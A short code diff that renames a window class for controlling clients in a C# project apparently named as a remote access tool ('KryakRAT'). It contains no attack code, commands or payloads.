@@ -7,11 +7,11 @@ using WinRT.Interop;
 
 namespace KryakRAT.Windows;
 
-public sealed partial class ClientControlWindow : Window
+public sealed partial class WindowsClientControlWindow : Window
 {
     private readonly UserData _user;
 
-    public ClientControlWindow(UserData user)
+    public WindowsClientControlWindow(UserData user)
     {
         InitializeComponent();
         _user = user;
